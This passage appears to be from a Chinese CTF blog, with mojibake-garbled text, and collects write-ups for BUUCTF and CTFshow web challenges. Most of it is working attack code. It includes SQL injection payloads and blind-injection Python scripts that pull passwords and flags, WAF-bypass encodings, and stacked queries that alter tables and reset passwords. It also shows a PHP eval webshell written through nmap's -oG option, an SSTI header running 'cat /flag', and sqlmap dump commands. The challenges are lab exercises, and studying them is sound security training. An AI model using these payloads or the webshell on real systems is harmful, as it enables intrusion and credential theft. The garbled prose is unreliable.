¼\n```\n\nåªèƒ½å°è¯•æŠ¥é”™æ³¨å…¥äº†\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n1'or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n```\n\næŠ¥é”™æ³¨å…¥é™åˆ¶é•¿åº¦ï¼Œç”¨rightå‡½æ•°åˆ‡å‰²\n\n\n\n\n\n## [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World\n\nå¸ƒå°”ç›²æ³¨\n\n```python\nimport requests\nurl=\"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php\"\nflagchar=\"flag{-abcdef1234567890}\"\nfor i in range(1,50):\n    for j in flagchar:\n        data={\n            'id':f\"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(j)},2,1)\"\n        }\n        tex=requests.post(url=url,data=data).text\n        if \"Do you want to be my girlfriend\" in tex:\n            print(j,end=\"\")\n            break\n```\n\n## [GXYCTF2019]BabyUpload\n\né¦–å…ˆå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œè¢«è¿‡æ»¤ï¼Œå°è¯•pngå›¾ç‰‡ï¼Œè¿‡æ»¤ï¼Œåªèƒ½ä¸Šä¼ jpegäº†ï¼ŒæˆåŠŸ\n\nå‘ç°æœåŠ¡å™¨æ˜¯apacheæœåŠ¡å™¨ï¼Œå°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶\n\n```\nAddType application/x-httpd-php .jpeg\n```\n\næˆåŠŸ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 20.14.17.png)\n\næˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 20.18.24.png)\n\nèšå‰‘é“¾æ¥å³å¯\n\n## [BUUCTF 2018]Online Tool\n\nä¸Šæ¥ä¸¤ä¸ªå‡½æ•°escapeshellarg()å’Œescapeshellcmd()\n\n```\nescapeshellarg()å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å«exec(),system()æ‰§è¡Œè¿ç®—ç¬¦ã€‚\n```\n\n```\nescapeshellcmd()å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&#;`|*?~<>^()[]{}$,\\x0Aå’Œ\\xFFã€‚'å’Œ\"ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ%å’Œ!å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚\n```\n\nä¸¤ä¸ªå‡½æ•°ä½¿ç”¨çš„ä¾‹å­\n\n```\nåŸå§‹è¾“å…¥ 172.17.0.2' -v -d a=1\nescapeshellargå¤„ç†å '172.17.0.2''' -v -d a=1'\nescapeshellcmdå¤„ç†å '172.17.0.2'\\'' -v -d a=1'\n```\n\nåœ¨æœ¬é¢˜ä¸­ï¼Œä½¿ç”¨çš„nmapæœ‰ä¸€ä¸ªåä¸º-oGçš„å‚æ•°é€‰é¡¹ï¼Œå¯ä»¥å°†nmapçš„å‘½ä»¤å’Œæ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶\n\n```\npayload:?host=' <?php @eval($_POST[\"kkk\"]);?> -oG kkk.php '\n```\n\nä¼ å…¥åå˜ä¸º\n\n```\nnmap -T5 -sT -Pn --host-timeout 2 -F ''<?php @eval($_POST[\"kkk\"]);?> -oG kkk.php''\n```\n\n## [BJDCTF2020]The mystery of ip\n\nSSTIæ¨¡ç‰ˆæ³¨å…¥ï¼Œä»¥åå­¦äº†åœ¨ç†è§£å§\n\n```\nX-Forwarded-For: {{system(\"cat /flag\")}}\n```\n\n\n\n## [RoarCTF 2019]Easy Calc\n\nPHPå­—ç¬¦ä¸²è§£ææ¼æ´ï¼ŒæŸ¥çœ‹æ•°æ®åŒ…è®¿é—®calc.php\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 22.29.28.png)\n\nå°è¯•ä¼ å…¥scandir()æ‰«ææ–‡ä»¶ï¼Œå‘ç°WAFé˜»æŒ¡ï¼Œå°†ä¼ å…¥å‚æ•°ç”±numæ”¹ä¸º numï¼Œphpè·å–åˆ°çš„å‚æ•°åç§°ä¸ºnumè€ŒWAFè·å–åˆ° numï¼Œç»•è¿‡WAFæˆåŠŸï¼Œæ‰«æå‘ç°åœ¨æ ¹ç›®å½•ä¸‹æœ‰f1aggæ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentå‡½æ•°è¯»å–æ–‡ä»¶å³å¯\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 22.35.38.png)\n\n\n\n## [ç½‘é¼æ¯ 2018]Fakebook\n\né¦–å…ˆæ³¨å†Œåè¿›å…¥ï¼Œå‘ç°noç–‘ä¼¼å­˜åœ¨SQLæ³¨å…¥ï¼Œå°è¯•union selectè¢«è¿‡æ»¤ï¼Œå°è¯•union/**/selectæˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15 13.17.59.png)\n\nçˆ†å‡ºå›æ˜¾ä½ç½®ï¼Œä»¥åŠä¼¼ä¹ç½‘é¡µå¯¹æ•°æ®åº“å†…å®¹è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œç¨åå†çœ‹ï¼Œå…ˆè¿›è¡ŒSQLæ³¨å…¥çˆ†å‡ºå†…å®¹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15 13.19.45.png)\n\nå‘ç°ç”¨æˆ·ä¿¡æ¯æ˜¯è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„ï¼Œä¸‹ä¸€æ­¥åº”å½“å°è¯•æŸ¥çœ‹æºç è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œè®¿é—®robots.txtå‘ç°äº†ç½‘ç«™æºç ï¼Œæºç å¯¹ç”¨æˆ·ä¼ å…¥çš„åšå®¢é“¾æ¥è¿›è¡Œè®¿é—®å¹¶æ¸²æŸ“ï¼Œç›´æ¥å°†é“¾æ¥æ”¹ä¸ºæœ¬åœ°æ–‡ä»¶å¹¶æ¸²æŸ“ï¼Œå¾—åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15 13.30.53.png)\n\n\n\n\n\n\n\n"},{"title":"GXYCTF2019_BabySQli","url":"/2022/04/13/GXYCTF2019-BabySQli/","content":"\né¦–å…ˆå°è¯•order byçˆ†å‡ºå­—æ®µæ•°ï¼Œè¢«è¿‡æ»¤äº†ï¼Œåªèƒ½ä½¿ç”¨union selectï¼Œåœ¨åˆ°ç¬¬å››ä½çš„æ—¶å€™æŠ¥é”™äº†ï¼Œç”±æ­¤å¯çŸ¥æœ‰ä¸‰ä¸ªå­—æ®µ\n\n```\nçŸ¥è¯†ç‚¹ï¼šåœ¨union selectæŸ¥è¯¢ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œ\n```\n\n"},{"title":"CTFshow_è§‚æ˜Ÿ","url":"/2022/04/12/CTFshow-è§‚æ˜Ÿ/","content":"\nä¸Šæ¥å°±å¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯sqlæ³¨å…¥ï¼Œå°è¯•å•å¼•å·é—­åˆ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-12 22.17.52.png)\n\nè¢«è¿‡æ»¤äº†\n\næµ‹è¯•åå‘ç°è¿‡æ»¤å†…å®¹å¦‚ä¸‹ï¼š\n\n```\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: union\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: and\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: sleep\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: limit\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: by\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: like\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: char\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ascii\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: handler\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: benchmark\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: '\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: \"\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ~\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: `\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: =\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ç©ºæ ¼\n```\n\nå¸¸è§„çš„sqlç›²æ³¨payloadå¤§è‡´ä¸ºï¼šid=1^if(ascii(substr(database(),1,1))=102,2,3)\n\n1^2=3\n\n1^3=2\n\nåˆ°æ­¤ï¼Œç»™å‡ºä¸€äº›ç»•è¿‡æ–¹æ³•ï¼Œé¦–å…ˆæ˜¯ç©ºæ ¼å¯ä»¥ä½¿ç”¨æ‹¬å·æˆ–è€…/**/ä»£æ›¿ï¼Œç„¶åasciiå¯ä»¥ä½¿ç”¨ordä»£æ›¿ï¼Œsubsträ¸­çš„é€—å·å¯ä»¥ä½¿ç”¨substr(å­—ç¬¦ä¸² from 1 for 1)æ¥ä»£æ›¿ä½¿ç”¨ï¼Œifä¸­çš„é€—å·å¯ä»¥ä¸ºä½¿ç”¨caseè¯­å¥ä»£æ›¿ï¼Œç­‰äºå·å’Œlikeå¯ä»¥ç”¨regexpä»£æ›¿ï¼Œæœ€ç»ˆæ›¿æ¢å‡ºçš„è¯­å¥å¦‚ä¸‹\n\nid=1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\n#CTFshow_è§‚æ˜Ÿ.py\nimport requests\n\nurl = \"http://411c2277-fdd1-4c6d-a294-dddbb8c3579d.challenge.ctf.show/?id=\"\nflagchar = \"ctfshow-{},abde1234567890\"\nnamechar = \"flag,ctfshow_qwertyuiopasdfghjklzxcvbnm1234567890\"\nfor i in range(1, 50):\n    for j in flagchar:\n        #payload=f\"1^case(ord(substr(database()from({i})for(1))))when({ord(j)})then(2)else(3)end\" åº“åï¼šweb1\n        #payload=f\"1^case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" è¡¨åï¼šflag\n        #payload=f\"1^case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)regexp(database()))from({i})for(1))))when({ord(j)})then(2)else(3)end\" åˆ—åï¼šflag\n        payload = f\"1^case(ord(substr((select(group_concat(flag))from(flag))from({i})for(1))))when({ord(j)})then(2)else(3)end\"\n        tex=requests.get(url=url+payload).text\n        if \"I asked nothing\" in tex:\n            print(j,end='')\n            break\n\n```\n\n"},{"title":"CTFshowSQLæ³¨å…¥","url":"/2022/04/07/CTFshowSQLæ³¨å…¥/","content":"\n**171**\n\nå…¥é—¨å¼€å§‹ï¼Œç›´æ¥union select\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**172**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user2\n0' union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+\n```\n\n**173**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user3\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+\n```\n\n**174**\n\nè¿”å›å†…å®¹ä¸­ä¸èƒ½æœ‰æ•°å­—äº†ï¼Œè¯•è¯•å¸ƒå°”æ³¨å…¥å§\n\nselect * from tableName limit i,n\n\niä¸ºç´¢å¼•ï¼Œnä¸ºæ•°é‡\n\néšä¾¿å†™çš„åƒåœ¾è„šæœ¬\n\n```python\nimport requests\nurl=\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45,57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n```\n\n**175**\n\nå•¥éƒ½æ²¡äº†æ—¶é—´ç›²æ³¨\n\n```python\nimport requests\nurl=\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45, 57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url = f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url, timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url=f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url,timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n\n```\n\næˆ–è€…è¯•è¯•æ–‡ä»¶è¯»å†™\n\n```\n1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+\n```\n\n**176**\n\nè¿‡æ»¤äº†union selectï¼Œå¤§å°å†™ç»•è¿‡æˆ–ä¸‡èƒ½å¯†ç `1' or 1=1--+`\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**177**\n\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œ/**/å³å¯ï¼Œä¸èƒ½ç”¨+ï¼Œurlä¼šè¢«è½¬æˆç©ºæ ¼\n\n```\n0'/**/union/**/select/**/1,2,group_concat(password)/**/from/**/ctfshow_user%23\n```\n\n**178**\n\nè¿‡æ»¤äº†ç©ºæ ¼å’Œ*ï¼Œåˆ¶è¡¨ç¬¦%09ç»•è¿‡\n\n```\n0'%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23\n```\n\n**179**\n\n%09ä¹Ÿæ²¡äº†ï¼Œè¿˜å‰©%0c\n\n```\n0'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23\n```\n\n**180**\n\nçœŸæ²¡æ‹›äº†ï¼Œçœ‹çœ‹wpï¼Œé€šè¿‡åå¼•å·åˆ†å‰²ï¼Œç»\n\n```\n0'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3\n```\n\nè¿˜æœ‰\n\n```\n0'or(id=26)and'1'='1\n```\n\n**181**\n\nselectä¸è§äº†ï¼Œä¸‡èƒ½å¯†ç \n\n```\n0'%0cor%0cid='26\n```\n\n**182**\n\nflagä¸è§äº†ï¼Œå…¶å®ä¸å½±å“ä¸Šé¢çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥å°è¯•æ¨¡ç³ŠåŒ¹é…\n\n```\n0'%0cor%0cusername%0clike%0c'%fla%\n```\n\n**183**\n\nä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œå¸ƒå°”ç›²æ³¨\n\n```\nWHERE email REGEXP 'a'\n```\n\næ„æ€æ˜¯åœ¨emailä¸­åŒ¹é…açš„\n\nå†™è„šæœ¬å’¯\n\n```python\nimport requests\nurl = 'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 1;\" in tex:\n        \tprint(j,end='')\n```\n\n**184**\n\nRIGHT JOIN å…³é”®å­—ä¼šå³è¡¨ (table_name2) é‚£é‡Œè¿”å›æ‰€æœ‰çš„è¡Œï¼Œå³ä½¿åœ¨å·¦è¡¨ (table_name1) ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œã€‚\n\n```\nSELECT column_name(s)\nFROM table_name1\nRIGHT JOIN table_name2\n```\n\næˆ‘ä»¬å°†åŒ¹é…åçš„è¡¨ä½œä¸ºå³è¡¨ï¼Œä½¿ç”¨æ­£åˆ™æŸ¥è¯¢å³å¯\n\n`ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))`\n\n```python\nimport requests\nurl = 'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({ord(j)})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n\n```\n\nè®°å¾—é—®onæ˜¯å•¥æ„æ€\n\n**185**\n\nè¿‡æ»¤äº†æ•°å­—ï¼Œç”¨true=1ç›¸åŠ æ„é€ æ•°å­—å’§\n\n```python\nimport requests\nurl = 'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\ndef lo(x):\n    tmp=\"true\"\n    for i in range(1,x):\n        tmp=tmp+\"+true\"\n    return tmp\nfor i in range(1,1000):\n    for j in flagstr:\n        data = {\n            'tableName': f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,({lo(i)}),(true))regexp(char({lo(ord(j))})))\"\n        }\n        tex = requests.post(url, data=data).text\n        if \"$user_count = 43;\" in tex:\n            print(j,end='')\n            break\n```\n\n**186**\n\nåŒä¸Šï¼Œå¼€æ‰“å°±å®Œäº†\n\n**187**\n\né’ˆå¯¹`md5(xxx,true)`çš„ç»•è¿‡ï¼š[é“¾æ¥](https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450)\n\nåªèƒ½å¯»æ‰¾md5\n\næ‰€ä»¥å¯†ç è¾“å…¥:ffifdyopå³å¯\n\nè¿›è¡Œè¿ç®—å¾—å‡ºçš„ç»“æœä¸º\n\n'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\n\nç”±äºoråé¢6ä¸ºçœŸï¼Œæ‰€ä»¥è¯­å¥æ’ä¸ºçœŸ\n\n**188**\n\nSQLæ¯”è¾ƒçœŸçœŸç¦»è°±\n\nå­—ç¬¦ä¸²å½“ä½œæ•°å­—å¤„ç†\n\nå³å½“mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—åšæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²å½“ä½œæ•°å­—æ¥æ¯”è¾ƒã€‚å¦‚123bacä¼šå½“ä½œ123å¤„ç†ã€‚  å› æ­¤æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å³ä½¿username=0ï¼Œä¹Ÿä¼šè¿”å›ä¸€äº›ä»¥0å¼€å¤´çš„æ•°æ®ã€‚\n\n00å³å¯\n\n**189**\n\nç©ºæ ¼æ¶ˆå¤±æ³•ï¼Œæç¤ºflagåœ¨api/flag.phpä¸­ï¼Œå¿…ç„¶è¦è¯»å–æ–‡ä»¶å’¯\n\nå°è¯•ç”¨æˆ·åå‘ç°åªæœ‰ä¸¤ç§å›æ˜¾ç»“æœï¼Œä¸€ç§æ˜¯æŸ¥è¯¢å¤±è´¥ï¼Œä¸€ç§æ˜¯å¯†ç é”™è¯¯\n\nå¸ƒå°”ç›²æ³¨èµ°èµ·\n\n```python\nimport requests\nurl = 'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f'if(load_file(\"/var/www/html/api/index.php\")regexp(\\'{tmp}\\'),0,1)#','password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"å¯†ç é”™è¯¯\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**190**\n\nè¿›è¡Œä¸€ä¸ªå¸ƒå°”çš„ç›²æ³¨\n\n```python\nimport requests\nurl = 'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and ((substr((select f1ag from ctfshow_fl0g),{i},1))='{j}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"å¯†ç é”™è¯¯\" in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**191**\n\nè¿‡æ»¤äº†file|into|asciiä¸Šä¸ªè„šæœ¬è¿˜èƒ½ç”¨\n\n**192**\n\nè¿‡æ»¤äº†file|into|ascii|ord|hexç»§ç»­ç”¨\n\n**193**\n\nè¿‡æ»¤äº†file|into|ascii|ord|hex|substré—®é¢˜ä¸å¤§ï¼Œæ¢left\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'\nflagstr = r\",{flqazwsxedcrvtgbyhnujmikolp-0123456789}_\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and (left((select f1ag from ctfshow_flxg),{i})='{tmp}')#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"ç”¨æˆ·åä¸å­˜åœ¨\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**194**\n\næˆ‘è°¢è°¢ä½ å•Šleftå’Œrightéƒ½æ²¡äº†\n\nè¿‡æ»¤äº†file|into|ascii|ord|hex|substr|char|left|right|substringï¼Œç”¨likeæˆ–è€…æ­£åˆ™ï¼ˆå…¶å®ç”¨midä¹Ÿè¡Œï¼‰\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_flxg\ncolumn:f1ag\n```\n\n```python\nimport requests\nurl = 'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'\nflagstr = r\"{flqazwsxedcrvtgbyhnujmikolp-0123456789}_,\"\nflag=''\nfor i in range(1,1000):\n\tfor j in flagstr:\n\t\ttmp=flag+j\n\t\tdata = {'username': f\"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('{tmp}')),1,0)#\",'password': '1',}\n\t\ttex = requests.post(url=url, data=data)\n\t\tif \"ç”¨æˆ·åä¸å­˜åœ¨\" not in tex.json()['msg']:\n\t\t\tprint(j,end='')\n\t\t\tflag=flag+j\n\t\t\tbreak\n```\n\n**195**\n\nå †å æ”¹å¯†ç å’¯ï¼ŒæŸ¥è¯¢è¯­å¥ä¸­çš„usernameæ²¡æœ‰ç”¨å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥æŸ¥è¯¢çš„æ—¶å€™ç”¨åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²\n\n```\n1;update`ctfshow_user`set`pass`=0x313131;\n1\n0x61646d696e\n111\n```\n\n**196**\n\nğŸ˜…\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-10 11.29.32.png)\n\n**197ï¼Œ198**\n\nä¸€ä¸ªwpè„šæœ¬\n\n```python\n# @Author:Y4tacker\nimport requests\n\nurl = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\"\nfor i in range(100):\n    if i == 0:\n        data = {\n            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '\n                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '\n                        'varchar(255);',\n            'password': f'{i}'\n        }\n        r = requests.post(url, data=data)\n    data = {\n        'username': '0x61646d696e',\n        'password': f'{i}'\n    }\n    r = requests.post(url, data=data)\n    if \"ç™»é™†æˆåŠŸ\" in r.json()['msg']:\n        print(r.json()['msg'])\n        break\n```\n\næˆ‘é€‰ç¦»è°±æ–¹æ³•ï¼š\n\n```\n# @Author:Y4tacker\n# username=0;show tables;\n# pass=ctfshow_user\n```\n\n**199ï¼Œ200**\n\nåªæœ‰ç¦»è°±æ–¹æ³•èƒ½ç”¨äº†\n\n**201**\n\nsqlmapä½¿ç”¨å¼€å§‹\n\n```\n//æŸ¥åº“\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" --dbs\n//æŸ¥è¡¨\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web --tables\n//æŸ¥å­—æ®µ \nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user --columns\n//æŸ¥å€¼\nsqlmap -u \"http://212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show/api/?id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C id,pass,username --dump\n```\n\n**202**\n\nä½¿ç”¨POSTè¯·æ±‚ï¼Œæ·»åŠ --dataå‚æ•°æ¥è®¾ç½®\n\n```\nsqlmap -u http://84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show/api/ --data=\"id=1\" --referer=\"ctf.show\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**203**\n\nè°ƒæ•´è¯·æ±‚æ–¹å¼ï¼Œæ­¤å¤„è°ƒæ•´ä¸ºPUTè¯·æ±‚ï¼Œè®°å¾—åŠ ä¸ŠContent-Typeä¸ç„¶ä¼šå˜è¡¨å•æäº¤\n\n```\nsqlmap -u http://86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show/api/index.php --referer=\"ctf.show\" --data=\"id=1\" --method=\"PUT\" --headers=\"Content-Type:text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump\n```\n\n**204**\n\nåŠ ä¸Šcookieï¼Œç”¨--cookie\n\n```\nsqlmap -u http://024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show/api/index.php 